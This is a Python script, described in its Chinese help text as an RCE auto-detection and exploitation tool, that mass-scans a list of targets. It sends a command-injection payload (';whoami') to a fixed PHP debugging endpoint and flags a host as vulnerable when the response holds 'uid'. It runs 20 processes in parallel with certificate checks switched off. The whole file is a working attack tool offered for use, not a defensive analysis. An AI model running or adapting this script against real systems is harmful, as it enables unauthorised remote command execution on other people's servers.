import argparse
import requests
from multiprocessing import Pool

requests.packages.urllib3.disable_warnings()


def check(target):
    target = f"{target}/__debugging_center_utils___.php?log=;whoami"
    headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101Firefox/120.0',
    'Content-Type': 'application/x-www-form-urlencoded',
    }
    try:
        response = requests.get(target, headers=headers, verify=False, timeout=3)
        if response.status_code == 200 and 'uid' in response.text:
            print(f"[*] {target} Is Vulnerable")
        else:
            print(f"[!] {target} Not Vulnerable")
    except Exception as e:
        print(e)

def main():
    parser = argparse.ArgumentParser(description="这是一个rce自动检测利用脚本")
    parser.add_argument('-u', '--url', help='输入一个url', dest='url')
    parser.add_argument('-f', '--file', help='输入一个文件名', dest='file')
    args = parser.parse_args()
    pool = Pool(20)
    try:
        if args.url:
            check(args.url)
        elif args.file:
            targets = []
            with open(args.file, "r") as f:
                for line in f.readlines():
                    line = line.strip()
                    if 'http' in line:
                        targets.append(line)
                    else:
                        line = "http://" + line
                        targets.append(line)
            pool.map(check, targets)
            pool.close()
    except Exception as e:
        print(e)


if __name__ == '__main__':
    main()